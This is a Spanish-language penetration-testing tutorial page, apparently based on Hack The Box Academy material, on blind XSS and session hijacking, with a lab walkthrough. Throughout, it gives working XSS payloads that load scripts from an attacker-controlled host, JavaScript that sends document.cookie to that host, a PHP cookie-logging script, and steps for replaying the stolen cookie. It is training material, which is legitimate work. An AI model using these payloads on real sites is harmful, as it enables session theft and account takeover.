
# Session Hijacking

Las aplicaciones web modernas utilizan cookies para mantener la sesión de un usuario durante diferentes sesiones de navegación. Esto permite que el usuario inicie sesión solo una vez y mantenga activa su sesión iniciada incluso si visita el mismo sitio web en otro momento o fecha. Sin embargo, si un usuario malintencionado obtiene los datos de las cookies del navegador de la víctima, puede obtener acceso con el usuario que ha iniciado sesión sin conocer sus credenciales.

Con la capacidad de ejecutar código JavaScript en el navegador de la víctima, podremos recopilar sus cookies y enviarlas a nuestro servidor para secuestrar su sesión iniciada realizando un ataque `Session Hijacking` (también conocido como `Secuestro de sesión` o `Cookie Stealing`).

***

## <mark style="color:purple;">Detección Blind XSS</mark>

Normalmente, iniciamos los ataques XSS intentando descubrir si existe una vulnerabilidad XSS y dónde se encuentra. Sin embargo, en este ejercicio, nos ocuparemos de una vulnerabilidad `Blind XSS`. Una vulnerabilidad `Blind XSS` se produce cuando la vulnerabilidad se activa en una página a la que no tenemos acceso.

Las vulnerabilidades XSS ciegas suelen ocurrir con formularios a los que solo pueden acceder determinados usuarios (por ejemplo, administradores). Algunos ejemplos posibles son:

* `Formularios de contacto`
* `Reseñas`
* `Detalles del usuario`
* `Tickets de soporte`
* `Encabezado de agente de usuario HTTP`

Ejecutemos esta prueba en un entorno vulnerable de Hack the Box Academy, el directorio ( `/hijacking`). Vemos una página de registro de usuario con varios campos, así que intentemos enviar un usuario `test` para ver cómo maneja el formulario los datos:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form.jpg" alt=""><figcaption></figcaption></figure>

Como podemos ver, una vez que enviamos el formulario obtenemos el siguiente mensaje:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg" alt=""><figcaption></figcaption></figure>

Esto indica que no veremos cómo se manejará nuestra entrada ni cómo se verá en el navegador, ya que aparecerá para el administrador solo en un determinado panel de administración al que no tenemos acceso. En casos normales (es decir, no ciegos), podemos probar cada campo hasta que obtengamos un cuadro `alert`, como lo que hemos estado haciendo a lo largo del módulo. Sin embargo, como no tenemos acceso al panel de administración en este caso,

&#x20;`¿Cómo podríamos detectar una vulnerabilidad XSS si no podemos ver cómo se maneja el resultado?`

Para ello, podemos utilizar el mismo truco que utilizamos en la sección anterior, que consiste en utilizar un payload de JavaScript que envíe una solicitud HTTP a nuestro servidor. Si se ejecuta el código JavaScript, obtendremos una respuesta en nuestra máquina y sabremos que la página es vulnerable.

Sin embargo, esto plantea dos problemas:

1. `¿Cómo podemos saber qué campo específico es vulnerable?` Dado que cualquiera de los campos puede ejecutar nuestro código, no podemos saber cuál de ellos lo hizo.
2. `¿Cómo podemos saber qué payload XSS utilizar?` Dado que la página puede ser vulnerable, pero el payload puede no funcionar

***

## <mark style="color:purple;">Cargar un script remoto</mark>

En HTML, podemos escribir código JavaScript dentro de las etiquetas `<script>`, pero también podemos incluir un script remoto proporcionando su URL, de la siguiente manera:

```html
<script src="http://NUESTRA_IP/script.js"></script>
```

Por lo tanto, podemos usar esto para ejecutar un archivo JavaScript remoto que se entrega en nuestra máquina virtual. Podemos cambiar el nombre del script solicitado por `script.js` a el nombre del campo en el que estamos inyectando, de modo que cuando recibamos la solicitud en nuestra máquina virtual, podamos identificar el campo de entrada vulnerable que ejecutó el script, de la siguiente manera:

```html
<script src="http://NUESTRA_IP/username"></script>
```

Si recibimos una solicitud para `/username`, entonces sabemos que el campo `username` es vulnerable a XSS, y así sucesivamente. Con eso, podemos comenzar a probar varios payloads XSS que cargan un script remoto y ver cuál de ellas nos envía una solicitud. Los siguientes son algunos ejemplos que podemos usar de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) :

```html
<script src=http://NUESTRA_IP></script>
'><script src=http://NUESTRA_IP></script>
"><script src=http://NUESTRA_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://NUESTRA_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//NUESTRA_IP");a.send();</script>
<script>$.getScript("http://NUESTRA_IP")</script>
```

Como podemos ver, varios paylads comienzan con una inyección como `'>`, que puede funcionar o no dependiendo de cómo se gestione nuestra entrada en el backend. Como se mencionó anteriormente en la sección [`XSS Discovery`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss/xss-discovery.md), si tuviéramos acceso al código fuente (es decir, en un XSS DOM), sería posible escribir con precisión el payload requerido para una inyección exitosa. Es por eso que Blind XSS tiene una mayor tasa de éxito con vulnerabilidades del tipo XSS DOM.

Antes de comenzar a enviar payloads, debemos iniciar un receptor en nuestra máquina virtual, usando `netcat` o `php` como se muestra en una sección anterior:

```shell-session
afsh4ck@kali$ mkdir /tmp/tmpserver
afsh4ck@kali$ cd /tmp/tmpserver
afsh4ck@kali$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Ahora podemos comenzar a probar estos payloads uno por uno usando uno de ellos para todos los campos de entrada y agregando el nombre del campo después de nuestra IP, como se mencionó anteriormente, como:

```html
<script src=http://NUESTRA_IP/fullname></script> # Esto va dentro del campo full-name
<script src=http://NUESTRA_IP/username></script> # Esto va dentro del campo username
...SNIP...
```

{% hint style="info" %}
**Consejo**: Notaremos que el correo electrónico debe coincidir con un formato de correo electrónico, incluso si intentamos manipular los parámetros de la solicitud HTTP, ya que parece estar validado tanto en el front-end como en el back-end. Por lo tanto, el campo de correo electrónico no es vulnerable y podemos omitir la prueba. Del mismo modo, podemos omitir el campo de contraseña, ya que las contraseñas generalmente están codificadas y no se muestran en texto sin formato. Esto nos ayuda a reducir la cantidad de campos de entrada potencialmente vulnerables que necesitamos probar.
{% endhint %}

Una vez que enviamos el formulario, esperamos unos segundos y verificamos nuestra terminal para ver si algo llamó a nuestro servidor. Si nada llama a nuestro servidor, entonces podemos continuar con la siguiente carga útil, y así sucesivamente. Una vez que recibimos una llamada a nuestro servidor, debemos anotar el último payload XSS que usamos como payload funcional y anotar el nombre del campo de entrada que llamó a nuestro servidor como el campo de entrada vulnerable.

<figure><img src="/files/9KpHuxQ14occntkWizET" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Secuestro de sesión</mark>

Una vez que encontramos un payload XSS funcional y hemos identificado el campo de entrada vulnerable, podemos proceder a la explotación XSS y realizar un ataque de secuestro de sesión.

Un ataque de secuestro de sesión es muy similar al ataque de phishing que realizamos en la sección anterior. Requiere un payload de JavaScript para enviarnos los datos necesarios y un script PHP alojado en nuestro servidor para capturar y analizar los datos transmitidos.

Hay varios payloads de JavaScript que podemos usar para capturar la cookie de sesión y enviárnosla, como lo muestra [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc) :

```javascript
document.location='http://NUESTRA_IP/index.php?c='+document.cookie;
new Image().src='http://NUESTRA_IP/index.php?c='+document.cookie;
```

El uso de cualquiera de los dos payloads debería funcionar para enviarnos una cookie, pero usaremos el segundo, ya que simplemente agrega una imagen a la página, que puede no parecer muy maliciosa, mientras que la primera navega a nuestra página PHP de captura de cookies, que puede parecer sospechosa.

Podemos escribir cualquiera de estos payloads de JavaScript en `script.js`, que también se alojará en nuestra máquina virtual:

{% code title="script.js" %}

```javascript
new Image().src='http://NUESTRA_IP/index.php?c='+document.cookie
```

{% endcode %}

Ahora, podemos cambiar la URL en el payload XSS que encontramos anteriormente para usar `script.js`( No olvides reemplazar NUESTRA\_IP con la IP de su VM en el script.js y el payload XSS):

```html
<script src=http://NUESTRA_IP/script.js></script>
```

Con nuestro servidor PHP en funcionamiento, ahora podemos usar el código como parte de nuestro payload XSS, enviarlo en el campo de entrada vulnerable y deberíamos recibir una llamada a nuestro servidor con el valor de la cookie. Sin embargo, si hubiera muchas cookies, es posible que no sepamos qué valor de cookie pertenece a qué encabezado de cookie. Por lo tanto, podemos escribir un script PHP para dividirlas con una nueva línea y escribirlas en un archivo. En este caso, incluso si varias víctimas activan el exploit XSS, obtendremos todas sus cookies ordenadas en un archivo.

Podemos guardar el siguiente script PHP como `index.php` y volver a ejecutar el servidor PHP:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Ahora, esperamos a que la víctima visite la página vulnerable y vea nuestro payload XSS. Una vez que lo haga, recibiremos dos solicitudes en nuestro servidor, una para `script.js`, que a su vez realizará otra solicitud con el valor de la cookie:

```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Como se mencionó anteriormente, obtenemos el valor de la cookie directamente en la terminal, como podemos ver. Sin embargo, dado que preparamos un script PHP, también obtenemos el archivo `cookies.txt` con un registro limpio de cookies:

```shell-session
afsh4ck@kali$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

Por último, podemos utilizar esta cookie en la página `login.php` para acceder a la cuenta de la víctima. Para ello, una vez que naveguemos a `/hijacking/login.php`, podemos pulsar `Shift+F9` en Firefox para que se muestre `Storage` en la barra de Herramientas para desarrolladores. Luego, podemos hacer clic en el botón `+` en la esquina superior derecha y agregar nuestra cookie, donde el `Name` es la parte antes de `=` y el `Value` es la parte después de `=` de nuestra cookie robada:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg" alt=""><figcaption></figcaption></figure>

Una vez que configuramos nuestra cookie, podemos refrescar la página y obtendremos acceso como la víctima:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg" alt=""><figcaption></figcaption></figure>

***

## Caso práctico

```
Objetivo: 10.129.32.116
```

Intente repetir lo que aprendió en esta sección para identificar el campo de entrada vulnerable y encontrar un payload XSS que funcione, y luego use los scripts '`Session Hijacking`' para obtener la cookie del administrador y usarla en '`login.php`' para obtener la flag.

### Detección de Bind XSS

Accedemos al directorio `/hijacking` y tenemos un formulario de registro:

<figure><img src="/files/mVChKsTHyVfslcTj2PcR" alt=""><figcaption></figcaption></figure>

Cuando enviamos los datos nos dice que un admin revisará la solicitud de registro:

<figure><img src="/files/2lwr06IydoQpZhf08k2e" alt=""><figcaption></figcaption></figure>

Esto nos podría dar indicio de un posible Bind XSS. Si observamos la URL vemos los nombres de los distintos campos:

```
http://10.129.32.116/hijacking/?fullname=Test&username=test&password=test&email=test%40test.es&imgurl=test
```

```
fullname, username, password, email, imgurl
```

Vamos a usar esto para introducir scripts de prueba en cada campo

### Cargar un script remoto

Vamos a probar a introducir scripts en todos los campos, y cambiando el nombre del script.js al nombre del input, para ver cual nos devuelve una respuesta. Los payloads podrían ser algo así:

```html
"><script src="http://10.10.14.182/fullname"></script>
"><script src="http://10.10.14.182/username"></script>
"><script src="http://10.10.14.182/password"></script>
"><script src="http://10.10.14.182/email"></script>
"><script src="http://10.10.14.182/imgurl"></script>
```

Este proceso es prueba y error hasta que encontramos un payload válido. Vamos a abrir un servidor local con PHP de la siguiente manera:

```shell-session
afsh4ck@kali$ mkdir /tmp/tmpserver
afsh4ck@kali$ cd /tmp/tmpserver
afsh4ck@kali$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Ahora vamos a probar a introducir los payloads:

<figure><img src="/files/NHenzMlQoXt4HODWqcuL" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Notaremos que el correo electrónico debe coincidir con un formato de correo electrónico, incluso si intentamos manipular los parámetros de la solicitud HTTP, ya que parece estar validado tanto en el front-end como en el back-end. Por lo tanto, el campo de correo electrónico no es vulnerable y podemos omitir la prueba.
{% endhint %}

Entonces ponemos un email test y le damos a `Register`:

<figure><img src="/files/uK0Pghv4ehiZXaC5RpL4" alt=""><figcaption></figcaption></figure>

Observemos que nos devuelve una petición GET con status 200, concretamente en el input de `imgurl`:

<figure><img src="/files/dvjJtmbTDHevN1nD1M65" alt=""><figcaption></figcaption></figure>

Ahora que ya conocemos el input vulnerable, vamos a hacer un Session Hijacking para extraer la cookie de la víctima.

### Secuestro de sesión

Podemos usar alguno de estos payload para conseguir un `Session Hijacking`:

```javascript
document.location='http://NUESTRA_IP/index.php?c='+document.cookie;
new Image().src='http://NUESTRA_IP/index.php?c='+document.cookie;
```

El uso de cualquiera de los dos payloads debería funcionar para enviarnos una cookie, pero usaremos el segundo, ya que simplemente agrega una imagen a la página, que puede no parecer muy maliciosa, mientras que la primera navega a nuestra página PHP de captura de cookies, que puede parecer sospechosa. Vamos a guardar el siguiente payload como `script.js:`

{% code title="script.js" %}

```javascript
new Image().src='http://10.10.14.182/index.php?c='+document.cookie;
```

{% endcode %}

Y el payload final que usaremos en el input vulnerable apuntará a este `script.js`):

<pre class="language-html"><code class="lang-html"><strong>">&#x3C;script src=http://10.10.14.182/script.js>&#x3C;/script>
</strong></code></pre>

Con nuestro servidor PHP en funcionamiento, ahora podemos usar el código como parte de nuestro payload XSS, enviarlo en el input vulnerable y deberíamos recibir una llamada a nuestro servidor con el valor de la cookie. Sin embargo, si hubiera muchas cookies, es posible que no sepamos qué valor de cookie pertenece a qué encabezado de cookie. Por lo tanto, podemos escribir un script PHP para dividirlas con una nueva línea y escribirlas en un archivo. En este caso, incluso si varias víctimas activan el exploit XSS, obtendremos todas sus cookies ordenadas en un archivo.

Podemos guardar el siguiente script PHP como `index.php` y volver a ejecutar el servidor PHP:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Vamos a ello:

<figure><img src="/files/Uf0kzGsPwj8xB62qDszS" alt=""><figcaption></figcaption></figure>

1. Introducimos el payload en el input vulnerable
2. Le damos a Register
3. Recibimos la cookie

<figure><img src="/files/eAb2JZ2TZ9QNdXYAlZE5" alt=""><figcaption></figcaption></figure>

```
[200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
```

Buum! Ya tenemos la cookie! Vamos a usarla para acceder en `/login.php`:

* Abrimos el inspector
* Storage > Add Item

<figure><img src="/files/CyZ1H5T89lv9WFRTT4Xh" alt=""><figcaption></figcaption></figure>

Aquí añadimos la cookie que hemos encontrado.

{% hint style="info" %}
**Importante**: También debes cambiar el nombre de la cookie a `'cookie'`
{% endhint %}

<figure><img src="/files/NGBD0tc7c4s2mFarHtsn" alt=""><figcaption></figcaption></figure>

Recargamos la página y accedemos sin problema usando la cookie de la víctima:

<figure><img src="/files/DX6OtQyh7rsIEfKQeJvy" alt=""><figcaption></figcaption></figure>
